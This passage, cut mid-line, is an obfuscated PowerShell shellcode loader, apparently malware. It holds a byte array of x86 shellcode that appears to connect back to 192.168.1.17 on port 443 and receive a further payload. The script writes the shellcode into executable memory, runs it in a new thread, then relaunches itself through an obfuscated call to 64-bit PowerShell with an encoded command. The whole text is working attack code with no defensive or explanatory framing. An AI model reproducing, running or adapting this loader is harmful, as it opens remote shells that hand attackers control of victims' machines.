,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x11,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$I619=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($I619.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$I619,0,0,0);for (;;){Start-sleep 60};';${E} =  ${3`1E6a}::"TOb`A`s`E64Str`InG"( ( &("{1}{0}"-f'r','DI') ('v'+'ariA'+'bL'+'E:wVe') )."VA`lue"::"uNi`co`De".("{0}{2}{1}"-f 'Get','s','Byte').Invoke(${U`gm}));${K`c5} = ("{1}{0}{3}{2}" -f 'dComma','-Encode',' ','nd');if( ${s`EfJ}::"sI`zE" -eq 8){${V`TC8} = ${Env`:S`ysteMrOOT} + ((("{9}{6}{2}{5}{13}{0}{8}{3}{4}{12}{1}{7}{14}{11}{10}"-f 'ndo','30Jv','643','ow','e','0JW','w','1.030J','wsP','30Jsyswo','l','owershel','rShell','i','p'))  -CrEPLacE  ([cHAr]51+[cHAr]48+[cHAr]74),[cHAr]92);&("{0}{1}"-f 'i','ex') ('& '+"$VtC8 "+"$Kc5 "+"$e")}else{;&("{0}{1}" -f 'i','ex') ('& '+'po'+'we'+'rshell '+"$Kc5 "+"$e");}
